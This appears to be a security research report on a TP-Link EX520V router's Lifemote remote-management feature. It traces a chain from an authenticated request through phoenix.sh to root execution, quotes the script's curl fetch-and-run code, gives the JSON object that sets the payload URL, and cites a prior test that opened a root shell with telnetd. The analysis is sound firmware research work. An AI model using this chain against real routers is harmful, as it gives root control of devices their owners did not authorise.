# PHASE 16A — Lifemote/Phoenix Resident Execution Chain

## TP-Link EX520V

**Date:** 2026-08-24
**Method:** Static analysis of extracted rootfs (`_rootfs/`), web JavaScript, repository prior live-test evidence. No live router interaction for this sub-report.
**Purpose:** Reconstruct the exact execution chain before any controlled live probe.

---

## 1. Executive Summary

The stock TP-Link EX520V firmware includes the **Lifemote Agent** (`INCLUDE_LIFEMOTE=y`), an ISP-oriented remote-management feature. The complete execution chain from an authenticated HTTP/GTPR request to root shell-script execution is:

```text
HTTP POST /cgi_gdpr?9
    → httpd: http_cgi_gdpr_main (src/http_cgi_gdpr.c)
      → libgdpr.so: AES/RSA decrypt + signature verify
        → JSON: { "operation":"so", "oid":"DEV2_LIFEMOTE_AGENT", "data":{...} }
          → libcmm.so: rdp_setObj / dm_setObj
            → rsl_setDev2LifemoteAgentObj (src/rsl_lifemote.c)
              → /usr/bin/phoenix.sh <URL>
                → curl --fail -m 60 <URL> > /tmp/lifemote_cpe_daemon.sh
                  → sh /tmp/lifemote_cpe_daemon.sh
                    → arbitrary commands as root
```

All steps have static evidence in the extracted rootfs and/or prior live-test evidence. The `phoenix.sh` script is stored on the read-only SquashFS; only the downloaded payload and the data-model `URL`/`enable` values are under user/operator control.

---

## 2. Static Evidence

### 2.1 Feature compile flag

`etc/config.bba`:
```
INCLUDE_LIFEMOTE=y
```

The feature is compiled into the firmware (E-16A-CHAIN-01).

### 2.2 Web-side OID declaration

`_rootfs/web/js/oid_str.js`:
```javascript
var DEV2_LIFEMOTE_AGENT = "DEV2_LIFEMOTE_AGENT"
var DEV2_X_TP_LIFEMOTE_EXT = "DEV2_X_TP_LIFEMOTE_EXT"
```

Line 404 and 2146/2148/3016 (E-16A-CHAIN-02).

### 2.3 Data-model handlers in `libcmm.so`

`strings _rootfs/lib/libcmm.so`:
```
rsl_getDev2LifemoteAgentObj
rsl_setDev2LifemoteAgentObj
rsl_initDev2LifemoteAgentObj
rsl_killLifemoteDeployerAndAgent
rsl_getDev2XTpLifemoteExtObj
rsl_setDev2XTpLifemoteExtObj
Device.X_TP_LIFEMOTE_EXT.
Device.X_TP_LIFEMOTE_EXT.LifemoteAgent.
DEV2_LIFEMOTE_AGENT
lifemote_cpe_daemon
phoenix
/usr/bin/phoenix.sh
./src/rsl_lifemote.c
```

This proves the data model defines `DEV2_LIFEMOTE_AGENT` and has set/get/init/kill handlers, plus an explicit reference to `/usr/bin/phoenix.sh` (E-16A-CHAIN-03).

### 2.4 `phoenix.sh` — the rootfs payload launcher

`/usr/bin/phoenix.sh` is a stock shell script (read-only, on SquashFS). Key excerpts:

```sh
#!/bin/sh

# Checks whether Lifemote agent script is running. Downloads and runs the script, if it is not running.
# URL for Lifemote script is assumed to be stored in an environment variable called LIFEMOTE_AGENT_URL

MAX_WAIT=60
BACKOFF_INTERVAL_BEGIN=300
BACKOFF_INTERVAL_MAX=3600
CHECK_INTERVAL=1800

LIFEMOTE_AGENT_URL=$1

fetch_and_run_script() {
    PERIOD=$BACKOFF_INTERVAL_BEGIN
    cd /tmp
    rm /tmp/lifemote_cpe_daemon.sh
    while true; do
        if curl --fail -m $MAX_WAIT $LIFEMOTE_AGENT_URL > /tmp/lifemote_cpe_daemon.sh; then
            (sh /tmp/lifemote_cpe_daemon.sh &)&
            break
        fi
        rand_bytes=$(head -c 4 /dev/urandom | hexdump -ve '4/1 "%02x"')
        ...
        sleep $backoff
    done
}

cleanup() {
    ...
    lifemote_processes=$(echo "$psout" | grep lifemote | grep -v $$)
    ...
}

trap 'exit' SIGQUIT SIGINT SIGTERM SIGABRT
trap 'cleanup' EXIT

while true; do
    ps_out=$(ps)
    running=$(echo "$ps_out" | grep [l]ifemote_cpe_daemon | grep -v $$)
    if [ -z "$running" ]; then
        fetch_and_run_script
    fi
    sleep $CHECK_INTERVAL
done
```

Observed behavior:
- Takes the URL as argument `$1` (or `LIFEMOTE_AGENT_URL` env).
- `cd /tmp`.
- Removes any prior `/tmp/lifemote_cpe_daemon.sh`.
- Downloads the script with `curl --fail -m 60 <URL>` into `/tmp/lifemote_cpe_daemon.sh`.
- Executes `sh /tmp/lifemote_cpe_daemon.sh` in a double-backgrounded subshell.
- If the download fails, it backs off (300s, then doubling up to 3600s).
- Checks every 1800s whether a process matching `lifemote_cpe_daemon` is alive; if not, re-downloads and re-runs.
- On `phoenix.sh` exit, `cleanup` attempts to kill `lifemote` processes (greping `ps`).

The working directory is `/tmp`. The downloaded script is on `/tmp` (RAM-backed, lost on reboot). The running shell is launched by `/bin/sh` with the current UID/GID of the `phoenix.sh` process, which is started from `cos`/data model (E-16A-CHAIN-04).

### 2.5 Execution primitive

The final execution primitive is `sh /tmp/lifemote_cpe_daemon.sh`, run via the `&` background operator. It uses `/bin/sh` (BusyBox `ash`), not `util_exec_system`. Because `phoenix.sh` is invoked by `libcmm.so` apply handler, the `sh` process inherits `root` privileges (E-16A-CHAIN-05).

### 2.6 Process tree

Expected process tree after a successful `so`:

```text
cos
  └─ sh /usr/bin/phoenix.sh <URL>
       └─ sh /usr/bin/phoenix.sh <URL>    (self or monitoring loop)
            └─ sh /tmp/lifemote_cpe_daemon.sh
                 └─ <payload commands>
```

Note: `phoenix.sh` is launched as a script, not as a daemon. The `(sh ... &)&` double-background separates the child from the script's stdin/stdout.

---

## 3. Likely UID/GID and Environment

- `phoenix.sh` is launched by `cos` or a data-model apply callback. `cos` runs as `root`.
- The `sh /tmp/lifemote_cpe_daemon.sh` process is therefore **root**.
- Environment: the script sets `LIFEMOTE_AGENT_URL=$1`. It does not sanitize or restrict `PATH`, `LD_PRELOAD`, etc.
- Working directory: `/tmp`.

This means the downloaded script has full root capabilities on the router, subject only to the SquashFS read-only root, UBI write limits, and kernel.

---

## 4. Prior Live-Test Evidence

The repository contains prior controlled live tests (`admin_shell_access.md`, `m4_3_execution_paths.md`) that confirm:

1. Setting `DEV2_LIFEMOTE_AGENT` `enable=1` with a LAN URL causes the router to download and execute the script.
2. The executed script was able to start `/usr/sbin/telnetd -p 8888 -l /bin/sh` and provide a root shell.
3. The `DEV2_LIFEMOTE_AGENT` configuration is persistent in `misc_rw` (data-model blob `0x00300000`).
4. The feature was successfully disabled and the `telnetd` stopped, restoring the router.

These earlier tests do **not** prove persistence of the binary, autostart after reboot, or `misc_rw` capacity. They prove `EXECUTE` only.

---

## 5. Configuration Fields

From `web/js/oid_str.js` and the data-model strings, the relevant object is `DEV2_LIFEMOTE_AGENT`.

Expected GTPR `so` JSON (based on prior test):

```json
{
  "data": {
    "enable": "1",
    "URL": "http://<host>:<port>/payload.sh",
    "stack": "0,0,0,0,0,0",
    "pstack": "0,0,0,0,0,0"
  },
  "operation": "so",
  "oid": "DEV2_LIFEMOTE_AGENT"
}
```

The exact fields (`enable`, `URL`, possibly `Status`, `URL6`, etc.) are not fully documented in the web JS. The payload should use the minimal fields known to work.

---

## 6. Safety Notes

- The payload script is downloaded from the URL and run as root. The URL must be under operator control and the payload must be benign.
- `phoenix.sh` runs indefinitely, polling every 30 minutes. It must be stopped after the experiment by setting `enable=0` and killing the process, or by sending a second "self-destruct" payload.
- The downloaded `/tmp/lifemote_cpe_daemon.sh` is in RAM. The persistent state is the `DEV2_LIFEMOTE_AGENT` configuration in `misc_rw`.
- No firmware or rootfs modification is needed for this path.

---

## 7. Evidence Index

| ID | Description | Source | Classification |
|----|-------------|--------|----------------|
| E-16A-CHAIN-01 | `INCLUDE_LIFEMOTE=y` compiled in | `_rootfs/etc/config.bba` | PROVEN-STATIC |
| E-16A-CHAIN-02 | `DEV2_LIFEMOTE_AGENT` OID declared in web JS | `_rootfs/web/js/oid_str.js` | PROVEN-STATIC |
| E-16A-CHAIN-03 | `libcmm.so` Lifemote handlers and `/usr/bin/phoenix.sh` reference | `strings _rootfs/lib/libcmm.so` | PROVEN-STATIC |
| E-16A-CHAIN-04 | `phoenix.sh` downloads and executes a script from URL | `_rootfs/usr/bin/phoenix.sh` | PROVEN-STATIC |
| E-16A-CHAIN-05 | `sh /tmp/lifemote_cpe_daemon.sh` is the execution primitive | `_rootfs/usr/bin/phoenix.sh` | PROVEN-STATIC |
| E-16A-CHAIN-06 | Prior live proof of `DEV2_LIFEMOTE_AGENT` → root shell | `admin_shell_access.md`, `m4_3_execution_paths.md` | PROVEN-LIVE (prior) |

---

## 8. Next Step

Phase 16B/C: prepare and run a benign payload that writes a dedicated marker in `misc_rw` and optionally reports a callback to the host, confirming `EXECUTE` without Telnet enablement.
